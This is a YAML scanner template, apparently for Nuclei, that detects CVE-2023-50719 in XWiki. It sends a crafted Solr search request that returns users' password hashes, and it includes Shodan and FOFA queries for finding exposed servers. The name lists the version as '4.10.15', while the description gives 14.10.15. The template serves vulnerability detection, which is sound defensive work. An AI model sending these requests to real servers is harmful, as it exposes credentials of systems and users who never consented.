http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - hash:SHA</span>
    - XWikiUsers[0].password
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale='
  - '{{BaseURL}}/xwiki/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale='
  stop-at-first-match: true
id: CVE-2023-50719
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-50719
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-359
    epss-percentile: 0.97786
    epss-score: 0.51803
  description: 'XWiki Platform is a generic wiki platform. Starting in 7.2-milestone-2
    and prior to versions 14.10.15, 15.5.2, and 15.7-rc-1, the Solr-based search in
    XWiki discloses the password hashes of all users to anyone with view right on
    the respective user profiles. By default, all user profiles are public. This vulnerability
    also affects any configurations used by extensions that contain passwords like
    API keys that are viewable for the attacker. Normally, such passwords aren''t
    accessible but this vulnerability would disclose them as plain text. This has
    been patched in XWiki 14.10.15, 15.5.2 and 15.7RC1. There are no known workarounds
    for this vulnerability.

    '
  impact: 'Successful exploitation could lead to disclosure of the password hashes
    of all users.

    '
  metadata:
    fofa-query: body="data-xwiki-reference"
    max-request: 2
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    vendor: xwiki
    verified: true
  name: XWiki < 4.10.15 - Sensitive Information Disclosure
  reference:
  - https://jira.xwiki.org/browse/XWIKI-21208
  - https://nvd.nist.gov/vuln/detail/CVE-2023-50719
  remediation: 'This has been patched in XWiki 14.10.15, 15.5.2 and 15.7RC1.

    '
  severity: high
  tags: cve,cve2024,xwiki,password,exposure,vuln
